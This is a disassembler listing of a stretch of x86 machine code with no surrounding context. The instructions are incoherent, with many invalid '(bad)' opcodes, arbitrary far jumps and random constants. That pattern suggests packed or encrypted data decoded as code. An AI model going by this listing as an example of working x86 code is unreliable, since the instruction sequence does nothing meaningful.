  4184d5:	loopne 0x4184b2
  4184d7:	mov    al,ds:0xe6ce8008
  4184dc:	inc    ebp
  4184dd:	sahf   
  4184de:	add    edi,DWORD PTR [ecx]
  4184e0:	lahf   
  4184e1:	mov    esi,0x9f8ea42d
  4184e6:	or     DWORD PTR [edx],ebp
  4184e8:	or     al,0x40
  4184ea:	popa   
  4184eb:	jp     0x4184f3
  4184ed:	sub    dh,BYTE PTR [eax]
  4184ef:	lea    esi,[edx]
  4184f1:	cmc    
  4184f2:	jecxz  0x4184b2
  4184f4:	dec    ecx
  4184f5:	fbld   TBYTE PTR [ecx-0x77]
  4184f8:	mov    ecx,0x9330963e
  4184fd:	mov    bh,BYTE PTR ds:0xce447e5e
  418503:	and    esi,ebx
  418505:	sub    eax,0xc7828dd
  41850a:	mov    BYTE PTR ds:0x76072ab,dh
	...
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	fisttp DWORD PTR [esi]
  418582:	push   esi
  418583:	jae    0x41851d
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR [ecx+eax*1],al
  41858a:	add    BYTE PTR [eax],al
  41858c:	cmp    bl,al
  41858e:	les    edx,FWORD PTR [esi+0x73]
  418591:	lods   al,BYTE PTR ds:[esi]
  418592:	jbe    0x4185e9
  418594:	sbb    ch,0x1d
  418597:	out    dx,al
  418598:	shl    DWORD PTR [edx],0x58
  41859b:	rcl    DWORD PTR [ebx+0x38],1
  41859e:	lds    esp,FWORD PTR [eax-0x1503312a]
  4185a4:	jmp    0x84d6:0xdce337ff
  4185ab:	(bad)  
  4185ac:	cmp    DWORD PTR [ecx-0x33224d8b],ebp
  4185b2:	loop   0x418590
  4185b4:	rol    BYTE PTR [eax+edx*2],0xf
  4185b8:	cmp    eax,0x60bcf822
  4185bd:	add    esi,DWORD PTR [edx-0x71]
  4185c0:	loopne 0x418626
  4185c2:	icebp  
  4185c3:	mov    ds:0x58ad8b00,al
  4185c8:	pop    eax
  4185c9:	arpl   bx,ax
  4185cb:	push   esi
  4185cc:	cmp    eax,0x7cd8da1b
  4185d1:	inc    ebp
  4185d2:	mov    bh,BYTE PTR [esi+0x75]
  4185d5:	test   al,0xe3
  4185d7:	fst    st(4)
  4185d9:	aam    0xe
  4185db:	pop    edi
  4185dc:	lahf   
  4185dd:	rcl    DWORD PTR [edi+0x49a5a335],1
  4185e3:	mov    dh,0x6e
  4185e5:	sar    DWORD PTR cs:[edi-0x12793980],1
  4185ec:	push   eax
  4185ed:	pop    es
  4185ee:	dec    edx
  4185ef:	pop    eax
  4185f0:	daa    
  4185f1:	pop    es
  4185f2:	test   BYTE PTR [eax-0x6efbf5e2],ah
  4185f8:	cwde   
  4185f9:	lahf   
  4185fa:	adc    al,0xaa
  4185fc:	retf   
  4185fd:	mov    al,ds:0xf5361def
  418602:	dec    edx
  418603:	test   esp,ebx
  418605:	and    eax,0x8c3a280c
  41860a:	rcl    DWORD PTR [edi+ebp*2+0x3705baaf],cl
  418611:	pop    edi
  418612:	(bad)  
  418613:	jmp    0xaaff698c
  418618:	fimul  WORD PTR [esi-0x7c]
  41861b:	sbb    ecx,esp
  41861d:	(bad)  
  41861e:	sub    al,0x44
  418620:	sti    
  418621:	lahf   
  418622:	mov    dl,al
  418624:	cmc    
  418625:	push   edi
  418626:	sub    esp,DWORD PTR [ebx+eax*1-0x67]
  41862a:	add    al,0x23
  41862c:	jo     0x41864d
  41862e:	push   ebp
  41862f:	(bad)  
  418630:	fidiv  DWORD PTR [esi+esi*1-0x68d800d0]
  418637:	or     dl,BYTE PTR [ebx+0x67]
  41863a:	cmp    esi,DWORD PTR ds:0xa285cf36
  418640:	cmp    BYTE PTR [esi-0x70],al
  418643:	(bad)  
  418644:	xchg   ecx,eax
  418645:	or     al,0xbd
  418647:	dec    ecx
  418648:	mov    edx,0xbfaf0606
  41864d:	jp     0x418698
  41864f:	imul   esp,DWORD PTR [ebx-0x50],0x419cfb9c
  418656:	pop    esp
  418657:	or     esp,esp
  418659:	and    ecx,edi
  41865b:	cmp    al,0x70
  41865d:	scas   eax,DWORD PTR es:[edi]
  41865e:	and    ah,al
  418660:	cli    
  418661:	std    
  418662:	cmp    esp,edi
  418664:	clc    
  418665:	not    bh
  418667:	push   0xd4c7b0da
  41866c:	push   es
  41866d:	mov    ebp,0x96637510
  418672:	mov    ecx,0x68300e49
  418677:	xor    bh,ah
  418679:	test   eax,0xa8ffb722
  41867e:	frstor [ecx*1-0x11ebbdbc]
  418685:	les    eax,FWORD PTR [edx-0x36cf8b2b]
  41868b:	xchg   esp,eax
  41868c:	add    al,0x61
  41868e:	sub    eax,0x4e
	...
  4186f3:	add    BYTE PTR [ebx-0x44c35fd8],dl
  4186f9:	mov    esp,0x8d0caf9f
  4186fe:	cmp    edx,edx
  418700:	mov    ds:0x9cd72fd7,al
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR [ecx+eax*1],al
  41870a:	add    BYTE PTR [eax],al
  41870c:	ret    
  41870d:	xchg   esp,eax
  41870e:	cmp    eax,0x346d930d
  418713:	imul   esp,ecx,0x3b
  418716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418717:	push   edi
  418718:	dec    edi
  418719:	sbb    DWORD PTR [esi],ecx
  41871b:	push   esi
  41871c:	mov    fs,WORD PTR [edi]
  41871e:	clc    
  41871f:	and    ah,bh
  418721:	dec    esp
  418722:	arpl   sp,sp
  418724:	xor    ecx,eax
  418726:	test   al,0xfb
  418728:	nop
  418729:	int3   
  41872a:	pop    esp
  41872b:	xor    eax,0x5873fddb
  418730:	loop   0x418773
  418732:	pop    edi
  418733:	retf   0xfd93
  418736:	xor    eax,0xa77fdbba
  41873b:	or     eax,esi
  41873d:	xor    DWORD PTR cs:[eax+0x39],edx
  418741:	loope  0x4186f9
  418743:	cmp    BYTE PTR [esi],cl
  418745:	pop    edi
  418746:	inc    ebp
  418747:	out    dx,eax
  418748:	mov    WORD PTR [ebx+0x26],gs
  41874b:	je     0x41872a
  41874d:	stos   DWORD PTR es:[edi],eax
  41874e:	xchg   esp,eax
  41874f:	icebp  
  418750:	dec    edx
  418751:	mov    ebx,0x97f608b9
  418756:	sbb    DWORD PTR [eax-0x7f1a3e71],edi
  41875c:	and    DWORD PTR [esi+edx*1+0x196f42f],esp
  418763:	mov    ah,0x2f
  418765:	xchg   esp,eax
  418766:	mov    al,0x17
  418768:	jns    0x418700
  41876a:	sub    al,0xe8
  41876c:	jge    0x41874f
  41876e:	and    bl,bl
  418770:	and    al,0xce
  418772:	pop    esp
  418773:	into   
  418774:	mov    al,0x28
  418776:	push   esp
  418777:	mov    esp,0x4c01bd40
  41877c:	add    esi,DWORD PTR [ecx-0x75]
  41877f:	pushf  
  418780:	ds mov esp,0x60332a2c
  418786:	mov    al,0x50
  418788:	int    0xaf
  41878a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41878b:	stos   DWORD PTR es:[edi],eax
  41878c:	es and ebx,edi
  41878f:	rol    BYTE PTR [esi-0x5d],1
  418792:	scas   eax,DWORD PTR es:[edi]
  418793:	ja     0x41880f
  418795:	pop    ss
  418796:	fbld   TBYTE PTR [eax]
  418798:	test   DWORD PTR [ebp-0x6e],eax
  41879b:	lods   al,BYTE PTR ds:[esi]
  41879c:	(bad)  
  41879d:	cmp    eax,0xee941b98
  4187a2:	push   ss
  4187a3:	sub    eax,0x7cd13639
  4187a8:	rcl    BYTE PTR gs:[ebp-0x6ef9d2b8],0x4e
  4187b0:	in     al,0x5f
  4187b2:	int3   
  4187b3:	fnsave [ecx]
  4187b5:	mov    ch,0x8
  4187b7:	inc    ebp
  4187b8:	mov    bh,BYTE PTR [edx]
  4187ba:	sub    al,BYTE PTR [ebp-0x4545242c]
  4187c0:	pop    esp
  4187c1:	test   DWORD PTR [esi+eiz*2-0x46],edx
  4187c5:	nop
  4187c6:	out    dx,eax
  4187c7:	fmul   st(0),st
  4187c9:	cmp    bl,BYTE PTR [edi-0x2403e479]
  4187cf:	cmp    cl,BYTE PTR [edi-0x42]
  4187d2:	rol    DWORD PTR [ebp+0x47],cl
  4187d5:	test   DWORD PTR [edx+0x4abbbbbf],edi
  4187db:	dec    edi
  4187dc:	sbb    eax,0xf8234eba
  4187e1:	lds    ebx,FWORD PTR ds:0xc1474d75
  4187e7:	daa    
  4187e8:	or     ebx,DWORD PTR ds:0xfb4da34c
  4187ee:	jecxz  0x41877c
  4187f0:	add    al,0x39
  4187f2:	imul   edx,DWORD PTR [ecx],0x92012fe3
  4187f8:	(bad)  
  4187f9:	lds    eax,FWORD PTR cs:0xc09862c6
  418800:	jae    0x4187cd
  418802:	enter  0x26aa,0xc9
  418806:	fdivrp st(3),st
  418808:	ja     0x4187fc
  41880a:	mov    cl,0x5f
  41880c:	ins    DWORD PTR es:[edi],dx
  41880d:	push   eax
  41880e:	fld    QWORD PTR [eax]
	...
  418871:	add    BYTE PTR [eax],al
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi-0x3863c533]
  418881:	neg    ecx
  418883:	dec    esp
  418884:	mov    al,ds:0x4000103
  418889:	add    DWORD PTR [eax],eax
  41888b:	add    dh,al
  41888d:	inc    eax
  41888e:	mov    bh,0x89
  418890:	xor    al,0x8
  418892:	rol    BYTE PTR ss:0xe197ad45,1
  418899:	in     eax,dx
  41889a:	clc    
  41889b:	cmp    eax,0xbbe631b
  4188a0:	cmp    BYTE PTR [edx+0x6924868],cl
  4188a6:	jge    0x418841
  4188a8:	cld    
  4188a9:	repnz aas 
  4188ab:	imul   BYTE PTR [edx-0x6f7f79ba]
  4188b1:	aas    
  4188b2:	jl     0x418904
  4188b4:	sub    edi,DWORD PTR [esi+0x42]
  4188b7:	cmp    edi,eax
  4188b9:	lods   eax,DWORD PTR ds:[esi]
  4188ba:	test   DWORD PTR [edx],edi
  4188bc:	sbb    ebp,DWORD PTR [edi]
  4188be:	cdq    
  4188bf:	inc    edi
  4188c0:	scas   eax,DWORD PTR es:[edi]
  4188c1:	call   0xbbcd:0xc1803ad7
  4188c8:	pop    eax
  4188c9:	dec    ebx
  4188ca:	cmp    al,0x8c
  4188cc:	(bad)  
  4188ce:	mov    eax,0xbd0136c1
  4188d3:	and    DWORD PTR [edx-0x49],esi
  4188d6:	sbb    ebp,DWORD PTR [ecx-0x39]
  4188d9:	out    0xbb,al
  4188db:	add    esi,DWORD PTR [ebx]
  4188dd:	loopne 0x418930
  4188df:	or     al,0x2e
  4188e1:	mov    eax,0xd0644a62
  4188e6:	hlt    
  4188e7:	adc    esi,DWORD PTR [edi]
  4188e9:	add    BYTE PTR ds:0x2c7bbea7,dl
  4188ef:	jmp    0x5d07:0x346d2c51
  4188f6:	jle    0x418916
  4188f8:	inc    edi
  4188f9:	(bad)  
  4188fa:	mov    edi,0xf3f231b
  4188ff:	inc    ebx
  418900:	daa    
  418901:	adc    ch,dl
  418903:	fcomip st,st(0)
  418905:	lods   eax,DWORD PTR ds:[esi]
  418906:	jge    0x41897a
  418908:	jg     0x418930
  41890a:	dec    edi
  41890b:	push   es
  41890c:	lds    edi,FWORD PTR [esi+0x1d]
  41890f:	xchg   BYTE PTR [eax+0x49],cl
  418912:	dec    esp
  418913:	xchg   ecx,eax
  418914:	out    dx,eax
  418915:	adc    edx,0x7e
  418918:	adc    ah,BYTE PTR [ecx]
  41891a:	inc    esp
  41891b:	mov    eax,0xb587c20c
  418920:	xchg   ebp,eax
  418921:	shl    edi,cl
  418923:	pop    esp
  418924:	pop    esi
  418925:	out    0x1a,al
  418927:	add    ebx,DWORD PTR [edi+eiz*4-0x3df323c1]
  41892e:	jg     0x418913
  418930:	or     DWORD PTR [ebx-0x6d],esp
  418933:	adc    BYTE PTR [esi],ch
  418935:	ja     0x4188be
  418937:	cmp    BYTE PTR [ecx+edi*2],ch
  41893a:	ret    
  41893b:	jnp    0x418986
  41893d:	fistp  WORD PTR [edx+eiz*4]
  418940:	dec    edx
  418941:	push   esp
  418942:	aaa    
  418943:	jne    0x4189af
  418945:	dec    ebp
  418946:	ficom  WORD PTR [esi+0x9]
  418949:	dec    edx
  41894a:	mov    eax,0x4572f45
  41894f:	add    eax,0x65bde2
  418954:	mov    al,ds:0x74aced2d
  418959:	dec    edi
  41895b:	mov    bh,dl
  41895d:	retf   0xd06
  418960:	sti    
  418961:	rol    DWORD PTR [eax+0x64],0x5a
  418965:	not    edx
  418967:	push   0x26063d1c
  41896c:	jp     0x418981
  41896e:	lods   eax,DWORD PTR ss:[esi]
  418970:	jo     0x4189e5
  418972:	or     ecx,ebx
  418974:	scas   eax,DWORD PTR es:[edi]
  418975:	lea    edi,[esp+eax*1-0x2d]
  418979:	xchg   DWORD PTR [ebx],ebp
  41897b:	scas   eax,DWORD PTR es:[edi]
  41897c:	enter  0x7308,0xc
  418980:	xchg   BYTE PTR [ebx],ch
  418982:	dec    edx
  418983:	retf   0x42dd
  418986:	mov    ch,0x4a
  418988:	fisttp WORD PTR [ebx]
  41898a:	jae    0x4189d9
  41898c:	inc    eax
  41898d:	dec    edx
  41898e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41898f:	iret   
	...
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0x9501fe69
  418a03:	inc    ecx
  418a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR [ecx+eax*1],al
  418a0a:	add    BYTE PTR [eax],al
  418a0c:	mov    esi,0x8d578803
  418a11:	push   ebx
  418a12:	xor    DWORD PTR [ecx+0x1c],ecx
  418a15:	mov    al,0x31
  418a17:	pop    edi
  418a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a19:	mov    esi,0x7690b994
  418a1e:	xchg   DWORD PTR ds:0xe9ea802b,edx
  418a24:	mov    esp,0xbe1169d0
  418a29:	(bad)  
  418a2a:	das    
  418a2b:	gs or  al,0x46
  418a2e:	clc    
  418a2f:	lahf   
  418a30:	push   edx
  418a31:	hlt    
  418a32:	fsubr  DWORD PTR es:[ecx]
  418a35:	aas    
  418a36:	fsubr  DWORD PTR [eax+0x78]
  418a39:	push   edx
  418a3a:	mov    esp,DWORD PTR [edi+0x42720907]
  418a40:	adc    al,BYTE PTR [edi+eiz*1-0x60b37238]
  418a47:	lea    esi,[ecx]
  418a49:	mov    eax,0x4326713a
  418a4e:	add    DWORD PTR [edi],0xffffffd3
  418a51:	pop    ecx
  418a52:	aam    0xa8
  418a54:	xchg   ebx,eax
  418a55:	pop    ss
  418a56:	stc    
  418a57:	aas    
  418a58:	push   esp
  418a59:	push   edi
  418a5a:	lahf   
  418a5b:	and    bh,ch
  418a5d:	or     DWORD PTR [ebp+edi*1+0x3e],esp
  418a61:	leave  
  418a62:	mov    edx,edi
  418a64:	mov    ebx,0xb535909
  418a69:	scas   eax,DWORD PTR es:[edi]
  418a6a:	out    0x74,al
  418a6c:	lods   eax,DWORD PTR ds:[esi]
  418a6d:	cld    
  418a6e:	jb     0x418ad5
  418a70:	ss xchg esi,eax
  418a72:	lahf   
  418a73:	addr16 xchg ebp,eax
  418a75:	repnz lea edx,[edi*4+0x16cb7a59]
  418a7d:	hlt    
  418a7e:	mov    al,0x57
  418a80:	cmp    eax,0x98235ee9
  418a85:	or     ah,bl
  418a87:	push   esp
  418a88:	mov    WORD PTR [ecx-0x571b1bfc],?
  418a8e:	push   esp
  418a8f:	mov    ebx,0xff18e54f
  418a94:	jle    0x418abd
  418a96:	sbb    eax,0x9b19499b
  418a9b:	cmp    ch,BYTE PTR [ebp+edi*8-0x6d4dbda5]
  418aa2:	xor    dh,BYTE PTR [ebp+0x6ab31d90]
  418aa8:	mov    al,0x39
  418aaa:	sub    ah,BYTE PTR [esi-0x5b]
  418aad:	(bad)  
  418aae:	in     al,dx
  418aaf:	lahf   
  418ab0:	mov    ebp,0x24893dfc
  418ab5:	push   es
  418ab6:	push   eax
  418ab7:	loopne 0x418a46
  418ab9:	cmp    ecx,ebx
  418abb:	xchg   esi,eax
  418abc:	jmp    0xcc99:0xb756a540
  418ac3:	(bad)  
  418ac4:	das    
  418ac5:	xlat   BYTE PTR ds:[ebx]
  418ac6:	dec    esi
  418ac7:	test   eax,0x2d22679
  418acc:	xor    eax,0xa32b34bd
  418ad1:	sub    eax,0xd4a512c3
  418ad6:	push   0xffffffa5
  418ad8:	test   BYTE PTR [edx],dh
  418ada:	out    dx,eax
  418adb:	mov    ah,BYTE PTR [edi+ebp*4]
  418ade:	xor    dh,cl
  418ae0:	popa   
  418ae1:	imul   esp,DWORD PTR [eax],0xffffffdf
  418ae4:	xlat   BYTE PTR ds:[bx]
  418ae6:	rcr    bl,cl
  418ae8:	(bad)  
  418ae9:	js     0x418b36
  418aeb:	(bad)  
  418aec:	or     eax,0x22abd7f4
  418af1:	jae    0x418ae5
  418af3:	(bad)  
  418af4:	mov    esp,0x47f668e9
  418af9:	cwde   
  418afa:	(bad)  
  418afb:	fsubr  DWORD PTR [edx+esi*1]
  418afe:	nop
  418aff:	shr    DWORD PTR [ebp-0x6a],1
  418b02:	mov    dh,0x7
  418b04:	jns    0x418aea
  418b06:	push   eax
  418b07:	mov    edx,edx
  418b09:	xchg   ebx,eax
  418b0a:	not    esp
  418b0c:	call   0x6f0594
	...
  418b71:	add    BYTE PTR [eax],al
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xf1
  418b81:	inc    eax
  418b82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b83:	stos   BYTE PTR es:[edi],al
  418b84:	test   al,0x5
  418b86:	add    DWORD PTR [eax],eax
  418b88:	add    al,0x1
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	adc    dh,BYTE PTR [ecx]
  418b8e:	sub    eax,0x88308260
  418b93:	sahf   
  418b94:	and    BYTE PTR ds:0xcf621685,bl
  418b9a:	and    ebx,ebx
  418b9c:	loope  0x418bad
  418b9e:	pop    es
  418b9f:	add    DWORD PTR [eax+0x26],edi
  418ba2:	int    0xf7
  418ba4:	ins    DWORD PTR es:[edi],dx
  418ba5:	mov    edx,0xf6f712ba
  418baa:	hlt    
  418bab:	mov    esi,0xcfa2f5c0
  418bb0:	mov    esp,DWORD PTR [edx-0x1d]
  418bb3:	mov    eax,edx
  418bb5:	call   0x465de62f
  418bba:	xchg   ebp,eax
  418bbb:	mov    fs,WORD PTR [edx-0x77]
  418bbe:	dec    esp
  418bbf:	adc    al,0x7f
  418bc1:	pop    ss
  418bc2:	mov    ch,0x83
  418bc4:	in     al,dx
  418bc5:	test   eax,0xd3d408ac
  418bca:	(bad)  
  418bcb:	mov    edi,0xb3fa4abc
  418bd0:	nop
  418bd1:	mov    eax,ds:0x6a5dfe52
  418bd6:	mov    es,eax
  418bd8:	stos   BYTE PTR es:[edi],al
  418bd9:	sahf   
  418bda:	xor    eax,0x65d09d28
  418bdf:	clc    
  418be0:	adc    al,BYTE PTR [edi+edi*2-0x58582c13]
  418be7:	fstp   QWORD PTR [edi-0x42c67ed9]
  418bed:	inc    ecx
  418bee:	xor    bl,al
  418bf0:	and    al,al
  418bf2:	mov    DWORD PTR [edx-0x60d6a89],esp
  418bf8:	es repz stc 
  418bfb:	dec    esi
  418bfc:	cmp    esp,DWORD PTR [eax]
  418bfe:	not    dl
  418c00:	push   0xc6e4fe92
  418c05:	nop
  418c06:	sub    DWORD PTR [eax+0x7a200821],eax
  418c0c:	mov    ds:0x4d6ca530,al
  418c11:	pop    es
  418c12:	inc    edi
  418c13:	neg    DWORD PTR [edx+0x3e]
  418c16:	and    eax,ebx
  418c18:	push   ecx
  418c19:	cmc    
  418c1a:	out    0xc7,eax
  418c1c:	rol    DWORD PTR [ebp-0x17],0x87
  418c20:	jb     0x418ba7
  418c22:	dec    eax
  418c23:	aam    0x26
  418c25:	test   BYTE PTR [ebx],al
  418c27:	inc    ebx
  418c28:	mov    esp,0x1d71ffd8
  418c2d:	repz add DWORD PTR [ebp-0x4811d300],ebx
  418c34:	xchg   DWORD PTR [edx+0x339ee6ef],edi
  418c3a:	repz xchg edx,eax
  418c3c:	out    dx,eax
  418c3d:	add    dh,BYTE PTR [edx-0x77]
  418c40:	ja     0x418be7
  418c42:	adc    ecx,DWORD PTR [edi-0x7a0a4d37]
  418c48:	pop    sp
  418c4a:	pushf  
  418c4b:	(bad)  [ebp+0x2ae770a]
  418c51:	mov    cs,WORD PTR [esi-0x424ec724]
  418c57:	lahf   
  418c58:	repnz stos DWORD PTR es:[edi],eax
  418c5a:	call   0xab3a4cb4
  418c5f:	jge    0x418c56
  418c61:	mov    eax,ds:0x4444f792
  418c66:	inc    eax
  418c67:	push   ebx
  418c68:	sbb    esp,DWORD PTR [ebx-0x3f]
  418c6b:	lahf   
  418c6c:	xchg   BYTE PTR [ebx+0x1f],ch
  418c6f:	jno    0x418c4c
  418c71:	pop    es
  418c72:	and    ecx,DWORD PTR [ebx+0x7]
  418c75:	sub    eax,0x1d342b26
  418c7a:	dec    ecx
  418c7b:	mov    dl,0xd8
  418c7d:	rol    BYTE PTR [esi+eiz*8],cl
  418c80:	xor    eax,0x3694d1f6
  418c85:	adc    eax,0x4c999dee
  418c8a:	jmp    0x418cc7
  418c8c:	fiadd  DWORD PTR [esi+0xf382]
	...
  418cf2:	add    BYTE PTR [eax],al
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	ror    BYTE PTR ds:0xacc8a525,cl
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    al,0x1
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	pop    ebx
  418d0d:	lea    esp,[esi+0x48]
  418d10:	ins    BYTE PTR es:[edi],dx
  418d11:	inc    ebx
  418d12:	pop    ecx
  418d13:	jno    0x418cec
  418d15:	adc    ch,BYTE PTR [edx]
  418d17:	xor    BYTE PTR [edi-0x397f8a1b],0x89
  418d1e:	sbb    BYTE PTR [edx+0x7a],0x4f
  418d22:	enter  0xf2c4,0x5
  418d26:	jne    0x418cd3
  418d28:	gs inc ecx
  418d2a:	pop    edi
  418d2b:	add    BYTE PTR [ecx],ah
  418d2d:	clc    
  418d2e:	repnz gs pop ebx
  418d31:	mov    ds,WORD PTR [esp+esi*8]
  418d34:	inc    esi
  418d35:	scas   eax,DWORD PTR es:[edi]
  418d36:	jmp    0x3959:0xde3a2003
  418d3d:	sub    ah,BYTE PTR [ebx+0x7f3814c5]
  418d43:	push   es
  418d44:	hlt    
  418d45:	(bad)  
  418d47:	aaa    
  418d48:	jg     0x418d5d
  418d4a:	jmp    0x5c94:0x392cdf3f
  418d51:	adc    eax,DWORD PTR [ecx+0x65]
  418d54:	and    edi,DWORD PTR [edi+eax*8-0x73]
  418d58:	jo     0x418d3e
  418d5a:	lods   al,BYTE PTR ds:[esi]
  418d5b:	inc    edx
  418d5c:	pop    ds
  418d5d:	pop    ecx
  418d5e:	cs popf 
  418d60:	xchg   DWORD PTR [ebp-0x34],edx
  418d63:	xor    eax,0x2e52406a
  418d68:	or     dh,BYTE PTR [ebx]
  418d6a:	mov    WORD PTR [ecx+0x40],?
  418d6d:	into   
  418d6e:	pop    edx
  418d6f:	stc    
  418d70:	xchg   ebx,eax
  418d71:	sbb    esp,ebp
  418d73:	ss (bad) 
  418d75:	inc    esp
  418d76:	addr16 push cs
  418d78:	lock xor ebp,edi
  418d7b:	jnp    0x418db2
  418d7d:	inc    esp
  418d7e:	fmul   DWORD PTR [ecx+ebp*4+0x11]
  418d82:	mov    ebx,0x43ae8b6b
  418d87:	mov    ah,0x1b
  418d89:	sub    al,BYTE PTR [ecx-0x1752ddfa]
  418d8f:	nop
  418d90:	or     ebp,ecx
  418d92:	idiv   BYTE PTR [ebp-0x53]
  418d95:	xor    eax,0x5247ad57
  418d9a:	test   DWORD PTR [eax+ecx*8],0x1d684917
  418da1:	es data16 adc al,0x33
  418da5:	or     esp,ecx
  418da7:	mov    ds:0xa06ca92,al
  418dac:	addr16 aas 
  418dae:	gs xchg ebx,eax
  418db0:	add    eax,0x49a3127e
  418db5:	in     al,dx
  418db6:	enter  0x984a,0xca
  418dba:	mov    bh,0x2d
  418dbc:	sbb    ah,dh
  418dbe:	and    eax,0x93bf3bd
  418dc3:	test   DWORD PTR [edx-0x43],0xfabfc061
  418dca:	loop   0x418d97
  418dcc:	lods   eax,DWORD PTR ds:[esi]
  418dcd:	test   BYTE PTR [ebx*2-0x343d2a2],bh
  418dd4:	test   eax,0x7bdbfaaf
  418dd9:	pusha  
  418dda:	push   edx
  418ddb:	or     al,0x56
  418ddd:	push   ebp
  418dde:	cmp    edx,edi
  418de0:	jae    0x418df0
  418de2:	mov    esp,0x463e672d
  418de7:	mov    ds:0xd4b965e5,al
  418dec:	dec    ebx
  418ded:	(bad)  
  418dee:	mov    edx,0x4c8a4fb9
  418df3:	inc    ebx
  418df4:	pop    es
  418df5:	cmc    
  418df6:	mov    ds:0xcf144343,eax
  418dfb:	push   cs
  418dfc:	dec    esp
  418dfd:	inc    ebx
  418dfe:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  418e00:	add    DWORD PTR [esi],edx
  418e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e03:	fidiv  WORD PTR [ebx-0x4326f67c]
  418e09:	sahf   
  418e0a:	jmp    esp
  418e0c:	inc    edx
  418e0d:	mov    esi,fs
  418e0f:	xchg   edi,eax
	...
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x65]
  418e81:	sub    eax,0x7b0a0dd
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    al,0x1
  418e8a:	add    BYTE PTR [eax],al
  418e8c:	daa    
  418e8d:	xchg   ecx,eax
  418e8e:	pop    edi
  418e8f:	rcr    BYTE PTR [ebx],cl
  418e91:	es repnz push ds
  418e94:	xor    eax,0x8950e308
  418e99:	sub    DWORD PTR [esi],ecx
  418e9b:	dec    esp
  418e9c:	sbb    dl,cl
  418e9e:	add    DWORD PTR [eax+ebx*2+0x30],0x6d38a3e1
  418ea6:	test   DWORD PTR ds:0x5afc729f,esp
  418eac:	mul    BYTE PTR [edx+eax*1+0x30d2ad23]
  418eb3:	icebp  
  418eb4:	sbb    BYTE PTR [eax],dh
  418eb6:	scas   eax,DWORD PTR es:[edi]
  418eb7:	js     0x418e6a
  418eb9:	push   edi
  418eba:	sar    BYTE PTR [ebp-0x6bf19e27],cl
  418ec0:	cmc    
  418ec1:	adc    edx,eax
  418ec3:	hlt    
  418ec4:	mov    edx,0xb78a82cd
  418ec9:	dec    esi
  418eca:	aam    0x3f
  418ecc:	clc    
  418ecd:	fwait
  418ece:	jno    0x418eea
  418ed0:	add    DWORD PTR [eax+0x468b807f],ebp
  418ed6:	xchg   edi,eax
  418ed7:	sub    eax,0xa912bce9
  418edc:	in     eax,dx
  418edd:	push   0x7a074548
  418ee2:	sub    al,0x4c
  418ee4:	sub    BYTE PTR [esi-0x1b54b861],bh
  418eea:	test   ch,0x32
  418eed:	dec    eax
  418eee:	imul   edi,DWORD PTR [ebp-0x37],0xffffffd0
  418ef2:	pushf  
  418ef3:	es push ebx
  418ef5:	xchg   ebp,eax
  418ef6:	idiv   BYTE PTR [esi-0x4f4e4f8f]
  418efc:	adc    eax,0x65019deb
  418f01:	mov    eax,edi
  418f03:	push   0xcd4cda30
  418f08:	rcr    dh,1
  418f0a:	inc    esp
  418f0b:	std    
  418f0c:	(bad)  
  418f0d:	enter  0xf17a,0x7e
  418f11:	inc    esi
  418f12:	mov    bl,0x83
  418f14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f15:	or     BYTE PTR [edi-0x68],ch
  418f18:	mov    eax,0xbd1a61dc
  418f1d:	fst    QWORD PTR [ebp-0x69]
  418f20:	sub    ecx,ecx
  418f22:	fisub  DWORD PTR [edx+0x3d8f7755]
  418f28:	xor    eax,0xcd3ef568
  418f2d:	lea    edi,[edx+0xfe2d780]
  418f33:	add    cl,BYTE PTR [edi+0xb]
  418f36:	push   eax
  418f37:	pop    eax
  418f38:	or     dl,BYTE PTR [ecx-0x18180c1f]
  418f3e:	fxch   st(5)
  418f40:	add    DWORD PTR [eax+ebp*4],ebx
  418f43:	mov    BYTE PTR [ecx+0x66e1cad5],ch
  418f49:	gs pop esp
  418f4b:	xchg   ebx,eax
  418f4c:	push   esi
  418f4d:	sub    BYTE PTR [edx],bl
  418f4f:	rcl    BYTE PTR [ecx+edi*1-0x79],1
  418f53:	bound  edx,QWORD PTR [ecx+0x75c8f678]
  418f59:	dec    ebp
  418f5a:	xchg   ebx,eax
  418f5b:	les    edx,FWORD PTR [eax+ebx*1-0x536504fe]
  418f62:	xchg   esi,eax
  418f63:	mov    edi,ss
  418f65:	sar    DWORD PTR [edx+0x34],0x25
  418f69:	std    
  418f6a:	jbe    0x418fd0
  418f6c:	ss sub al,0xa5
  418f6f:	mov    al,0x84
  418f71:	jp     0x418f8b
  418f73:	mov    esp,0xdee50844
  418f78:	stos   DWORD PTR es:[edi],eax
